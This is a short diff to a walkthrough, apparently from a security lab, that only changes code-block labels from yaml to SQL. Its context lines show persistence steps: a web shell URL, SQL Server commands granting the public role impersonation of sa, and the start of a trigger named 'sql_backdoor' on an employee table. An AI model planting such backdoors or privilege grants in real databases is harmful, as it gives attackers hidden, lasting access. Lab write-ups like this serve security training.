@@ -79,7 +79,7 @@ PS C:\Users\Administrator> explorer.exe http://10.10.219.169/shell.aspx
 ![]()
 
 3. Launch and execute the following four queries:
-```yaml
+```SQL
 sp_configure 'Show Advanced Options',1;
 RECONFIGURE;
 GO
@@ -91,7 +91,7 @@ GO
 
 ![]()
 
-```yaml
+```SQL
 USE master
 
 GRANT IMPERSONATE ON LOGIN::sa to [Public];
@@ -99,13 +99,13 @@ GRANT IMPERSONATE ON LOGIN::sa to [Public];
 
 ![]()
 
-```yaml
+```SQL
 USE HRDB
 ```
 
 ![]()
 
-```yaml
+```SQL
 CREATE TRIGGER [sql_backdoor]
 ON HRDB.dbo.Employees 
 FOR INSERT AS
